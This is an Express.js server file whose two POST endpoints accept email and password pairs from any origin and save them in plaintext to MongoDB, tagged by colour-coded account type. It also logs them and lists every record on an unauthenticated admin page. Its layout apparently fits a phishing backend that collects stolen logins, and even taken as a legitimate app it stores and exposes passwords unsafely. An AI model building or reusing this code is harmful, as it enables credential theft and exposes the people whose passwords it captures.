const express = require('express');
const app = express();
const path = require('path');
const bodyParser = require('body-parser');
const Cors = require('cors');

const {connectToDb,getDb} = require('./db');
const { error } = require('console');
const PORT = process.env.PORT || 3000;
app.use(express.static('public'));
app.use(express.urlencoded({extended : true}))
app.use(bodyParser.json());
app.use(Cors());


app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');

let db;

connectToDb((err) =>{
    if(!err){
        app.listen(PORT, () =>{
            console.log(`App running at ${PORT}`);
        })
        db = getDb()
    }
})

const currentDate = new Date();
const year = currentDate.getFullYear();
const month = currentDate.getMonth() + 1; // Months are zero-based
const day = currentDate.getDate();

const formattedCurrentDate = `${year}-${month < 10 ? '0' : ''}${month}-${day < 10 ? '0' : ''}${day}`;

const currentTime = new Date();
const hours = currentTime.getHours();
const minutes = currentTime.getMinutes();
const seconds = currentTime.getSeconds();

const formattedCurrentTime = `${hours < 10 ? '0' : ''}${hours}:${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;





app.get('/', async(req,res) =>{
    const result = await db.collection('CollectionOne').find().toArray();
    res.render('admin', {result})
    console.log(result)
})

app.post('/endpointOne', async (req, res) => {
    try {
        const { email, password } = req.body;

        //Authentication with the use of jwt to occur here

        const result = await db.collection('CollectionOne').insertOne({
            "AccountType": "blue",
            "Email address": email,
            "Password": password,
            "Date" : formattedCurrentDate,
            "Time" :formattedCurrentTime,
        });
        console.log(result)
        console.log("Document inserted successfully:");
        res.status(200).send("Inserted successfully");
    } catch (error) {
        console.error("Error inserting into database:", error);
        res.status(500).send("Internal Server Error");
    }
});



app.post('/endpoint2', async (req, res) => {
        try {
            const { email, password } = req.body;

             //Authentication with the use of jwt to occur here
    
            const result = await db.collection('CollectionOne').insertOne({
                "AccountType": "Pink",
                "Email address": email,
                "Password": password,
                "Date" : formattedCurrentDate,
                "Time" : formattedCurrentTime
            });
            console.log(result)
            console.log("Document inserted successfully:");
            res.status(200).send("Inserted successfully");
        } catch (error) {
            console.error("Error inserting into database:", error);
            res.status(500).send("Internal Server Error");
        }
    });

